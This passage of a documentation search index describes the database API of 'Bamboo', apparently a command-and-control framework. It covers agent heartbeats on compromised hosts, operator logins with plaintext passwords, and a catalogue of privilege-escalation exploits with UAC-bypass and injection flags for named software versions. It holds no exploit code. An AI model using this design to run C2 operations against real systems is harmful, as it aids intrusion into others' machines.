\"Integrity\": \"Medium\"\n    ],\n    [\n        \"agent_identifier\": \"ysa903nq\",\n        \"hostname\": \"bambooMachine2\",\n        \"publicIP\": \"84.120.93.211\",\n        \"privateIP\": \"192.168.88.110\",\n        \"Integrity\": \"High\"\n    ]\n]\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#check_agent_identifier","title":"check_agent_identifier","text":"<p>Determines if Bamboo Agent specified exist in the database</p>"},{"location":"Teamserver/Database/model_agents.html#usage_2","title":"Usage","text":"<pre><code>POST /agent/initial_connection/register\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_2","title":"Description","text":"<p>check_agent_identifier attempts to find specified agent identifier in <code>collection agents</code>, and determines if it exist in the database</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_2","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/Database/model_agents.html#arguments-example_1","title":"Arguments Example","text":"<pre><code>check_agent_identifier(\"5zrire9a\")\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#database-method_2","title":"Database Method","text":"Method Collection Return find_one agents Boolean (True of exist)"},{"location":"Teamserver/Database/model_agents.html#function-return_2","title":"Function Return","text":"Type Description Boolean If specified Bamboo Agent exist"},{"location":"Teamserver/Database/model_agents.html#return-example_2","title":"Return Example","text":"<pre><code>True\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#add_heartbeat","title":"add_heartbeat","text":"<p>Add new Bamboo Agent heartbeat information into database</p>"},{"location":"Teamserver/Database/model_agents.html#usage_3","title":"Usage","text":"<pre><code>POST /agent/initial_connection/register\nPOST /agent/heartbeat\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_3","title":"Description","text":"<p>add_heartbeat will allows Bamboo Teamserver to keep track of all Bamboo Agent status. It will be called when a new Bamboo Agent is registered or existing registered Bamboo Agent send their heartbeat. Only <code>collection heartbeats</code> will be affected.</p> <p>The model will first attempt to find the Bamboo Agent using their agent identifier to determine if the Bamboo Agent is new by extracting data. It will be empty if the Bamboo Agent is new. If the Bamboo Agent is new, it will insert the data into the collection. If the Bamboo Agent already exist, it will determine if the Bamboo Agent heartbeat was \"late\" or not and update the existing information. It will return different values depending on it.</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_3","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent heartbeat String Seconds before the next heartbeat current_time Date Current timestamp expected_time Date Expected timestamp to receive heartbeat (current_time + heartbeat) status String Update it to \"alive\""},{"location":"Teamserver/Database/model_agents.html#arguments-example_2","title":"Arguments Example","text":"<pre><code>add_heartbeat(\"5zrire9a\", \"6\", \"2024-07-30T16:38:15.653+00:00\", \"2024-07-30T16:38:21.653+00:00\", \"alive\")\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#database-method_3","title":"Database Method","text":"Method Collection Return Usage find heartbeats Data of Bamboo Agent. Empty if does not exist Determine if Bamboo Agent is new insert_one heartbeats Null Insert new Bamboo Agent information update_many heartbeats True for success, False for failed If Bamboo Agent heartbeat Bamboo Teamserver after expected_time update_many heartbeats True for success, False for failed Bamboo Agent heartbeat is punctual"},{"location":"Teamserver/Database/model_agents.html#insertion-example_1","title":"Insertion Example","text":"<pre><code>new_heartbeat = {\n    \"agent_identifier\": \"5zrire9a\",\n    \"heartbeat\": 6,\n    \"current_time\": \"2024-07-30T16:38:15.653+00:00\",\n    \"expected_time\": \"2024-07-30T16:38:21.653+00:00\",\n    \"status\": \"alive\"\n}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#update-example","title":"Update Example","text":"<pre><code>{\"agent_identifier\": \"5zrire9a\"}, \n{\"$set\": {\n    \"heartbeat\": 6, \n    \"current_time\": \"2024-07-30T16:38:15.653+00:00\", \n    \"expected_time\": \"2024-07-30T16:38:21.653+00:00\", \n    \"status\": \"alive\"\n    }\n}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#function-return_3","title":"Function Return","text":"Type Description Dictionary Added new heartbeat Dictionary Updated heartbeat"},{"location":"Teamserver/Database/model_agents.html#function-example","title":"Function Example","text":"<pre><code>{\"agent\": \"new\"}\n</code></pre> <pre><code>{\"agent\": \"punctual\"}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#get_heartbeat","title":"get_heartbeat","text":"<p>Retrieve Bamboo Agent status from heartbeats</p>"},{"location":"Teamserver/Database/model_agents.html#usage_4","title":"Usage","text":"<pre><code>POST /handler_func/agent/display\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_4","title":"Description","text":"<p>get_heartbeat objective is to extract the status of the Bamboo Agent to determine if they are \"dead\" or \"alive\" from the <code>collection heartbeats</code>. It will then loop through all the data and append only the status into a list, returning the list to Bamboo Teamserver.</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_4","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Teamserver/Database/model_agents.html#database-method_4","title":"Database Method","text":"Method Collection Return find heartbeats List status"},{"location":"Teamserver/Database/model_agents.html#function-return_4","title":"Function Return","text":"Type Description List Status of all Bamboo Agent in database"},{"location":"Teamserver/Database/model_agents.html#return-example_3","title":"Return Example","text":"<pre><code>data = [\n    \"dead\",\n    \"dead\",\n    \"alive\"\n]\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#status_dead","title":"status_dead","text":"<p>Update Bamboo Agent status to dead</p>"},{"location":"Teamserver/Database/model_agents.html#usage_5","title":"Usage","text":"<pre><code>Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_5","title":"Description","text":"<p>status_dead will update the specified Bamboo Agent status to dead in the <code>collection heartbeats</code>.</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_5","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/Database/model_agents.html#arguments-example_3","title":"Arguments Example","text":"<pre><code>status_dead(\"5zrire9a\")\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#database-method_5","title":"Database Method","text":"Method Collection Return update_many heartbeats Status of update (boolean)"},{"location":"Teamserver/Database/model_agents.html#function-return_5","title":"Function Return","text":"Type Description Dictionary Status of update"},{"location":"Teamserver/Database/model_agents.html#return-example_4","title":"Return Example","text":"<pre><code>{\"status\": \"done\"}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#find_dead_but_alive","title":"find_dead_but_alive","text":"<p>Extract all Bamboo Agent who are \"alive\"</p>"},{"location":"Teamserver/Database/model_agents.html#usage_6","title":"Usage","text":"<pre><code>Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_6","title":"Description","text":"<p>find_dead_but_alive will retrieve all registered Bamboo Agent status which are \"alive\" in the <code>collection heartbeats</code>.</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_6","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Teamserver/Database/model_agents.html#database-method_6","title":"Database Method","text":"Method Collection Return find heartbeats List of agent identifier that match the criteria"},{"location":"Teamserver/Database/model_agents.html#function-return_6","title":"Function Return","text":"Type Description Dictionary Contains a list of agent identifier"},{"location":"Teamserver/Database/model_agents.html#return-example_5","title":"Return Example","text":"<pre><code>{\"alive_agents\": [\"5zrire9a\", \"62yb10jd\", \"p12ls3da\"]}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#use_agent","title":"use_agent","text":"<p>Extract all information of specified Bamboo Agent</p>"},{"location":"Teamserver/Database/model_agents.html#usage_7","title":"Usage","text":"<pre><code>POST /hander_func/handler/use_agent\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_7","title":"Description","text":"<p>use_agent retrieve the information of the specified Bamboo Agent in <code>agents collection</code>.</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_7","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/Database/model_agents.html#arguments-example_4","title":"Arguments Example","text":"<pre><code>use_agent(\"5zrire9a\")\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#database-method_7","title":"Database Method","text":"Method Collection Return find_one agents List information of specified Bamboo agent (agent_data)"},{"location":"Teamserver/Database/model_agents.html#function-return_7","title":"Function Return","text":"Type Description Dictionary Contains a dictionary of agent information Dictionary None (no such agent)"},{"location":"Teamserver/Database/model_agents.html#return-example_6","title":"Return Example","text":"<pre><code>{\"agent_data\": {\n        \"agent_identifier\": \"5zrire9a\",\n        \"hostname\": \"bambooMachine\",\n        \"publicIP\": \"39.100.49.231\",\n        \"privateIP\": \"192.168.45.7\",\n        \"Integrity\": \"Medium\"\n}\n}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#remove_agent","title":"remove_agent","text":"<p>Remove all information of specified Bamboo Agent</p>"},{"location":"Teamserver/Database/model_agents.html#usage_8","title":"Usage","text":"<pre><code>POST /hander_func/handler/remove_agent\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_8","title":"Description","text":"<p>remove_agent will completely remove the specified Bamboo Agent information, from both <code>collection agents and heartbeats</code>. It will first check if the specified Bamboo Agent exist first before deleting the data.</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_8","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/Database/model_agents.html#arguments-example_5","title":"Arguments Example","text":"<pre><code>remove_agent(\"5zrire9a\")\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#database-method_8","title":"Database Method","text":"Method Collection Return find_one agents Boolean value delete_many agents Boolean value delete_many heartbeats Boolean value"},{"location":"Teamserver/Database/model_agents.html#function-return_8","title":"Function Return","text":"Type Description Dictionary Success Dictionary Failed"},{"location":"Teamserver/Database/model_agents.html#return-example_7","title":"Return Example","text":"<pre><code>{\n    \"status\": \"success\"\n}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#info_status","title":"info_status","text":"<p>Retrieve and update database (if needed) of Bamboo Agent status when command <code>info</code> is called</p>"},{"location":"Teamserver/Database/model_agents.html#usage_9","title":"Usage","text":"<pre><code>POST /handler_func/handler/info_status\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_9","title":"Description","text":"<p>info_status main objective is to return the status of the specified Bamboo Agent. This model will check if the specified Bamboo Agent is \"dead\" by comparing the <code>current timestamp</code> with the <code>expected timestamp</code> before returning the status of the specified Bamboo Agent.</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_9","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/Database/model_agents.html#arguments-example_6","title":"Arguments Example","text":"<pre><code>info_status(\"5zrire9a\")\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#database-method_9","title":"Database Method","text":"Method Collection Return find_one heartbeats List of information of specified Bamboo Agent"},{"location":"Teamserver/Database/model_agents.html#find-return-example","title":"Find Return Example","text":"<pre><code>[\n    \"agent_identifier\": \"5zrire9a\",\n    \"heartbeat\": 6,\n    \"current_time\": \"2024-07-30T16:38:15.653+00:00\",\n    \"expected_time\": \"2024-07-30T16:38:21.653+00:00\",\n    \"status\": \"alive\"\n]\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#function-return_9","title":"Function Return","text":"Type Description Dictionary Notify Bamboo Teamserver on specified Bamboo Agent status"},{"location":"Teamserver/Database/model_agents.html#return-example_8","title":"Return Example","text":"<pre><code>{\"agent_status\": \"alive\"}\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#remove_inactive","title":"remove_inactive","text":"<p>Remove all \"dead\" registered Bamboo Agent from the database</p>"},{"location":"Teamserver/Database/model_agents.html#usage_10","title":"Usage","text":"<pre><code>Automatic function in Bamboo Teamserver that cleans up Bamboo Agent in database\n</code></pre>"},{"location":"Teamserver/Database/model_agents.html#description_10","title":"Description","text":"<p>remove_inactive is used in the function that automatically remove data from the database. This model will help the function to automatically remove all \"dead\" Bamboo Agent from the database.</p>"},{"location":"Teamserver/Database/model_agents.html#function-arguments_10","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Teamserver/Database/model_agents.html#database-method_10","title":"Database Method","text":"Method Collection Return find heartbeats List of information of \"dead\" Bamboo Agents"},{"location":"Teamserver/Database/model_agents.html#function-return_10","title":"Function Return","text":"Type Description Dictionary List of \"dead\" Bamboo Agent"},{"location":"Teamserver/Database/model_agents.html#return-example_9","title":"Return Example","text":"<pre><code>[\n    [   \n        \"agent_identifier\": \"5zrire9a\",\n        \"heartbeat\": 6,\n        \"current_time\": \"2024-07-30T16:38:15.653+00:00\",\n        \"expected_time\": \"2024-07-30T16:38:21.653+00:00\",\n        \"status\": \"dead\"\n    ],\n    [   \n        \"agent_identifier\": \"wohw193j\",\n        \"heartbeat\": 9,\n        \"current_time\": \"2024-07-30T16:42:20.653+00:00\",\n        \"expected_time\": \"2024-07-30T16:42:29.653+00:00\",\n        \"status\": \"dead\"\n    ]\n]\n</code></pre>"},{"location":"Teamserver/Database/model_auth.html","title":"Model Class - authentication","text":"<p>This class contains all models that will be related to authentication. Therefore, it will only use the find method as the other methods are not needed for authentication related actions. This class will be interacting with the user collection and the heartbeats collection.</p>"},{"location":"Teamserver/Database/model_auth.html#login_auth","title":"login_auth","text":"<p>Authenticates Bamboo Client user credentials</p>"},{"location":"Teamserver/Database/model_auth.html#usage","title":"Usage","text":"<pre><code>POST /auth/login\n</code></pre>"},{"location":"Teamserver/Database/model_auth.html#description","title":"Description","text":"<p>login_auth will be called every time a Bamboo Client user wants to log in. This model will first determine if the username exist in the <code>collection users</code>. If it exist, it will then compare between the password one provided by the user and the password in the database and return the status accordingly. </p>"},{"location":"Teamserver/Database/model_auth.html#function-arguments","title":"Function Arguments","text":"Field Type Description username String Username input by user password String Password input by user"},{"location":"Teamserver/Database/model_auth.html#arguments-example","title":"Arguments Example","text":"<pre><code>login_auth(\"bambooUser\", \"adnap\")\n</code></pre>"},{"location":"Teamserver/Database/model_auth.html#database-method","title":"Database Method","text":"Method Collection Return find_one user List of specified user information"},{"location":"Teamserver/Database/model_auth.html#find-example","title":"Find Example","text":"<pre><code>[\n    \"username\": \"bambooUser\",\n    \"password\": \"adnap\",\n    \"status\": \"offline\"\n]\n</code></pre>"},{"location":"Teamserver/Database/model_auth.html#function-return","title":"Function Return","text":"Type Description String Notify Bamboo Teamserver of status"},{"location":"Teamserver/Database/model_auth.html#return-example","title":"Return Example","text":"<pre><code>Welcome\n</code></pre> <pre><code>Invalid-User\n</code></pre>"},{"location":"Teamserver/Database/model_auth.html#obtain_status","title":"obtain_status","text":"<p>Helps Bamboo Teamserver to determine spe</p>"},{"location":"Teamserver/Database/model_auth.html#usage_1","title":"Usage","text":"<pre><code>POST /auth/check_agent_status\n</code></pre>"},{"location":"Teamserver/Database/model_auth.html#description_1","title":"Description","text":"<p>obtain_status helps Bamboo Teamserver to obtain the status of the specified Bamboo Agent in the <code>collection heartbeats</code>. This is used when Bamboo Client user want to use a command that requires the Bamboo Agent to be \"alive\". It only returns that Bamboo Agent status.</p>"},{"location":"Teamserver/Database/model_auth.html#function-arguments_1","title":"Function Arguments","text":"Field Type Description agent_identifier String Identifier of Bamboo Agent"},{"location":"Teamserver/Database/model_auth.html#arguments-example_1","title":"Arguments Example","text":"<pre><code>obtain_status(\"5zrire9a\")\n</code></pre>"},{"location":"Teamserver/Database/model_auth.html#database-method_1","title":"Database Method","text":"Method Collection Return find heartbeats List of specified Bamboo Agent information"},{"location":"Teamserver/Database/model_auth.html#find-example_1","title":"Find Example","text":"<pre><code>[   \n    \"agent_identifier\": \"5zrire9a\",\n    \"heartbeat\": 6,\n    \"current_time\": \"2024-07-30T16:38:15.653+00:00\",\n    \"expected_time\": \"2024-07-30T16:38:21.653+00:00\",\n    \"status\": \"dead\"\n]\n</code></pre>"},{"location":"Teamserver/Database/model_auth.html#function-return_1","title":"Function Return","text":"Type Description Dictionary Notify Bamboo Teamserver of Bamboo Agent status"},{"location":"Teamserver/Database/model_auth.html#return-example_1","title":"Return Example","text":"<pre><code>\"agent_status\": \"alive\"\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html","title":"Model Class - exploits","text":"<p>This class contains all models related to exploits. Bamboo Teamserver makes use of the functions within this class to find, update, add, and delete exploits information stored in the database according to Bamboo Client command. This class will be interacting with the exploits collection only</p>"},{"location":"Teamserver/Database/model_exploits.html#view_all","title":"view_all","text":"<p>Retrieve all exploits information</p>"},{"location":"Teamserver/Database/model_exploits.html#usage","title":"Usage","text":"<pre><code>POST /exploits/view_all\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#description","title":"Description","text":"<p>view_all retrieves all exploits information stored in the database from the exploits collection.</p>"},{"location":"Teamserver/Database/model_exploits.html#function-arguments","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Teamserver/Database/model_exploits.html#database-method","title":"Database Method","text":"Method Collection Return find exploits Dictionary of all exploit information in the collection"},{"location":"Teamserver/Database/model_exploits.html#function-return","title":"Function Return","text":"Type Description List List of all exploit information in the collection"},{"location":"Teamserver/Database/model_exploits.html#return-example","title":"Return Example","text":"<pre><code>[\n  {\n    \"name\": \"filmora.exe\",\n    \"app_version\": \"Wondershare Filmora v11\",\n    \"LPE_start\": \"admin\",\n    \"LPE_end\": \"system\",\n    \"uac_bypass\": true,\n    \"drop-to-disk\": true,\n    \"inject\": true,\n    \"drop_file\": \"filmora.exe\"\n  },\n  {\n    \"name\": \"wacom.exe\",\n    \"app_version\": \"Wacom Tablet 6.3.45-1\",\n    \"LPE_start\": \"user\",\n    \"LPE_end\": \"system\",\n    \"uac_bypass\": false,\n    \"drop-to-disk\": true,\n    \"inject\": true,\n    \"drop_file\": \"\"\n  }\n]\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#add_exploit","title":"add_exploit","text":"<p>Insert new exploit into database</p>"},{"location":"Teamserver/Database/model_exploits.html#usage_1","title":"Usage","text":"<pre><code>POST /exploits/add\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#description_1","title":"Description","text":"<p>Insert a new exploit into the database <code>collection exploits</code>.</p>"},{"location":"Teamserver/Database/model_exploits.html#function-arguments_1","title":"Function Arguments","text":"Field Type Description configuration String List of new exploit information"},{"location":"Teamserver/Database/model_exploits.html#arguments-example","title":"Arguments Example","text":"<pre><code>add_exploit([\"newExploit.exe\", \"app_version_Bamboo\", \"user\", \"system\", False, True, True, \"\"])\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#database-method_1","title":"Database Method","text":"Method Collection Return insert_one exploits Dictionary exploit information to be added"},{"location":"Teamserver/Database/model_exploits.html#insert-example","title":"Insert Example","text":"<pre><code>new_exploit = {\n    \"name\": \"newExploit.exe\",\n    \"app_version\": \"app_version_Bamboo\",\n    \"LPE_start\": \"user\",\n    \"LPE_end\": \"system\",\n    \"uac_bypass\": False,\n    \"drop-to-disk\": True,\n    \"inject\": True,\n    \"drop_file\": \"\"\n}\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#function-return_1","title":"Function Return","text":"Type Description Boolean Status of insertion"},{"location":"Teamserver/Database/model_exploits.html#return-example_1","title":"Return Example","text":"<pre><code>True\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#del_exploit","title":"del_exploit","text":"<p>Delete specified exploit from database</p>"},{"location":"Teamserver/Database/model_exploits.html#usage_2","title":"Usage","text":"<pre><code>POST /exploits/delete\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#description_2","title":"Description","text":"<p>Delete an existing exploit from the database <code>collection exploits</code>.</p>"},{"location":"Teamserver/Database/model_exploits.html#function-arguments_2","title":"Function Arguments","text":"Field Type Description exploit_name String Name of exploit to be deleted"},{"location":"Teamserver/Database/model_exploits.html#arguments-example_1","title":"Arguments Example","text":"<pre><code>del_exploit(\"wacom.exe\")\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#database-method_2","title":"Database Method","text":"Method Collection Return find_one exploits List of information of specified exploit, None of does not exist delete_many exploits Delete all instance of specified exploit name"},{"location":"Teamserver/Database/model_exploits.html#function-return_2","title":"Function Return","text":"Type Description Dictionary Status of deletion"},{"location":"Teamserver/Database/model_exploits.html#return-example_2","title":"Return Example","text":"<pre><code>{\"status\": \"success\"}\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#find_one","title":"find_one","text":"<p>Retrieve information of a specified exploit</p>"},{"location":"Teamserver/Database/model_exploits.html#usage_3","title":"Usage","text":"<pre><code>POST /exploits/exist\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#description_3","title":"Description","text":"<p>Retrieve all information regarding the specified exploit from the <code>collection exploits</code>.</p>"},{"location":"Teamserver/Database/model_exploits.html#function-arguments_3","title":"Function Arguments","text":"Field Type Description exploit_name String Name of exploit"},{"location":"Teamserver/Database/model_exploits.html#arguments-example_2","title":"Arguments Example","text":"<pre><code>find_one(\"wacom.exe\")\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#database-method_3","title":"Database Method","text":"Method Collection Return find_one exploits List of information of specified exploit, None of does not exist"},{"location":"Teamserver/Database/model_exploits.html#function-return_3","title":"Function Return","text":"Type Description Dictionary Status of retrieving, list of data if applicable"},{"location":"Teamserver/Database/model_exploits.html#return-example_3","title":"Return Example","text":"<pre><code>{\n    \"status\": \"success\",\n    \"data\": {\n        \"name\": \"wacom.exe\",\n        \"app_version\": \"Wacom Tablet 6.3.45-1\",\n        \"LPE_start\": \"user\",\n        \"LPE_end\": \"system\",\n        \"uac_bypass\": false,\n        \"drop-to-disk\": true,\n        \"inject\": true,\n        \"drop_file\": \"\"\n    }\n}\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#modify","title":"modify","text":"<p>Modify specified exploit information (for Bamboo Client CLI)</p>"},{"location":"Teamserver/Database/model_exploits.html#usage_4","title":"Usage","text":"<pre><code>POST /exploits/modify\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#description_4","title":"Description","text":"<p>Modify information of exploit specified in <code>collection exploits</code>. Changes to be made will differ, therefore this model can dynamically modify the number of changes to be made accordingly.</p>"},{"location":"Teamserver/Database/model_exploits.html#function-arguments_4","title":"Function Arguments","text":"Field Type Description exploit_name String Name of exploit to be modified changes List List of changes to be made (differ accordingly)"},{"location":"Teamserver/Database/model_exploits.html#arguments-example_3","title":"Arguments Example","text":"<pre><code>modify(\"wacom.exe\", [\"name\": \"wacow.exe\"])\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#database-method_4","title":"Database Method","text":"Method Collection Return update_many exploits Status of update"},{"location":"Teamserver/Database/model_exploits.html#update-example","title":"Update Example","text":"<pre><code>{\n    \"name\": exploit_name\n}, \n{\"$set\": \n    {key: new_value}\n}\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#function-return_4","title":"Function Return","text":"Type Description Boolean Status of update"},{"location":"Teamserver/Database/model_exploits.html#return-example_4","title":"Return Example","text":"<pre><code>True\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#modify_gui","title":"modify_gui","text":"<p>Modify specified exploit information (for Bamboo Client GUI)</p>"},{"location":"Teamserver/Database/model_exploits.html#usage_5","title":"Usage","text":"<pre><code>POST /exploits/modify_gui\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#description_5","title":"Description","text":"<p>Modify information of exploit specified in <code>collection exploits</code>. Unlike the previous model, this model caters for the GUI, which will update all information of the specified exploit even if there are still the same.</p>"},{"location":"Teamserver/Database/model_exploits.html#function-arguments_5","title":"Function Arguments","text":"Field Type Description modified_exploit_name String Name of exploit to be modified new_name String Name to replace with new_app_version String App version to be replace with new_LPE_start String LPE start to be replace with new_LPE_end String LPE end to be replace with new_uac_bypass Boolean Uac_bypass to be replace with new_d2d Boolean Drop-to-disk to be replace with new_inj Boolean Injection to be replace with new_dropfile String Dropfile to be replace with"},{"location":"Teamserver/Database/model_exploits.html#arguments-example_4","title":"Arguments Example","text":"<pre><code>modify_gui(\"wacom.exe\", \"wacow.exe\", \"Wacom Tablet 6.3.45-1\", \"admin\", \"system\", \"true\", \"true\", \"false\", \"wacow.exe\")\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#database-method_5","title":"Database Method","text":"Method Collection Return update_many exploits Status of update"},{"location":"Teamserver/Database/model_exploits.html#update-example_1","title":"Update Example","text":"<pre><code>{\n    \"name\": exploit_name\n}, \n{\"$set\": \n    {\n        \"name\": new_name,\n        \"app_version\": new_app_version,\n        \"LPE_start\": new_LPE_start,\n        \"LPE_end\": new_LPE_end,\n        \"uac_bypass\": new_uac_bypass,\n        \"drop-to-disk\": new_d2d,\n        \"inject\": new_inj,\n        \"drop_file\": new_dropfile\n    }\n}\n</code></pre>"},{"location":"Teamserver/Database/model_exploits.html#function-return_5","title":"Function Return","text":"Type Description Boolean Status of update"},{"location":"Teamserver/Database/model_exploits.html#return-example_5","title":"Return Example","text":"<pre><code>True\n</code></pre>"},{"location":"Teamserver/Database/model_users.html","title":"Model Class - users","text":"<p>This class contains all models related to users. Bamboo Teamserver will make use of the functions within this class to find, update, add, and delete user information stored in the database according to Bamboo Client command. This class will be interacting with the users collection only</p>"},{"location":"Teamserver/Database/model_users.html#view_users","title":"view_users","text":"<p>Retrieve all users information</p>"},{"location":"Teamserver/Database/model_users.html#usage","title":"Usage","text":"<pre><code>POST /handler_func/handler/view_users\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#description","title":"Description","text":"<p>view_users retrieves all user information stored in the database from the users collection. After retrieving the information, the model will delete the password column, making only the username and status return.</p>"},{"location":"Teamserver/Database/model_users.html#function-arguments","title":"Function Arguments","text":"<p>Does not require any arguments</p>"},{"location":"Teamserver/Database/model_users.html#database-method","title":"Database Method","text":"Method Collection Return find user List of user information excluding password"},{"location":"Teamserver/Database/model_users.html#function-return","title":"Function Return","text":"Type Description List List of all user information excluding password"},{"location":"Teamserver/Database/model_users.html#return-example","title":"Return Example","text":"<pre><code>[\n    [\n        \"bambooUser\",\n        \"offline\"\n    ],\n    [\n        \"bambooUserTwo\",\n        \"online\"\n    ]\n]\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#user_online","title":"user_online","text":"<p>Updates user status to online</p>"},{"location":"Teamserver/Database/model_users.html#usage_1","title":"Usage","text":"<pre><code>POST /auth/login\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#description_1","title":"Description","text":"<p>When a Bamboo Client user log ins, Bamboo Teamserver will call this model to update the username status to \"online\" in the users collection.</p>"},{"location":"Teamserver/Database/model_users.html#function-arguments_1","title":"Function Arguments","text":"Field Type Description username String Username of Bamboo Client user"},{"location":"Teamserver/Database/model_users.html#arguments-example","title":"Arguments Example","text":"<pre><code>user_online(\"bambooUser\")\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#database-method_1","title":"Database Method","text":"Method Collection Return update_many user Status of update"},{"location":"Teamserver/Database/model_users.html#update-example","title":"Update Example","text":"<pre><code>{\n    \"username\": \"bambooUser\"\n}, \n{\"$set\": \n    {\n        \"status\": \"online\"\n    }\n}\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#function-return_1","title":"Function Return","text":"Type Description Dictionary Status of update"},{"location":"Teamserver/Database/model_users.html#return-example_1","title":"Return Example","text":"<pre><code>{\"status\": \"done\"}\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#user_offline","title":"user_offline","text":"<p>Updates user status to offline</p>"},{"location":"Teamserver/Database/model_users.html#usage_2","title":"Usage","text":"<pre><code>POST /auth/logout\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#description_2","title":"Description","text":"<p>When a Bamboo Client user log outs, Bamboo Teamserver will call this model to update the username status to \"offline\" in the users collection.</p>"},{"location":"Teamserver/Database/model_users.html#function-arguments_2","title":"Function Arguments","text":"Field Type Description username String Username of Bamboo Client user"},{"location":"Teamserver/Database/model_users.html#arguments-example_1","title":"Arguments Example","text":"<pre><code>user_offline(\"bambooUser\")\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#database-method_2","title":"Database Method","text":"Method Collection Return update_many user Status of update"},{"location":"Teamserver/Database/model_users.html#update-example_1","title":"Update Example","text":"<pre><code>{\n    \"username\": \"bambooUser\"\n}, \n{\"$set\": \n    {\n        \"status\": \"offline\"\n    }\n}\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#function-return_2","title":"Function Return","text":"Type Description Dictionary Status of update"},{"location":"Teamserver/Database/model_users.html#return-example_2","title":"Return Example","text":"<pre><code>{\"status\": \"done\"}\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#register_user","title":"register_user","text":"<p>Insert new user into the database</p>"},{"location":"Teamserver/Database/model_users.html#usage_3","title":"Usage","text":"<pre><code>POST /handler_func/handler/register_user\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#description_3","title":"Description","text":"<p>register_user is called when the Bamboo Client wants to register a set of new credentials into Bamboo Teamserver in the users collection.</p>"},{"location":"Teamserver/Database/model_users.html#function-arguments_3","title":"Function Arguments","text":"Field Type Description username String New username password String New password"},{"location":"Teamserver/Database/model_users.html#arguments-example_2","title":"Arguments Example","text":"<pre><code>register_user(\"bambooUserNew\", \"paSsWOrd@111\")\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#database-method_3","title":"Database Method","text":"Method Collection Return insert_one user Status of insertion"},{"location":"Teamserver/Database/model_users.html#insert-example","title":"Insert Example","text":"<pre><code>{\n    \"username\": \"bambooUserNew\",\n    \"password\": \"paSsWOrd@111\",\n    \"status\": \"offline\"\n}\n</code></pre>"},{"location":"Teamserver/Database/model_users.html#function-return_3","title":"Function Return","text":"Type Description Boolean Status of insertion"},{"location":"Teamserver/Database/model_users.html#return-example_3","title":"Return 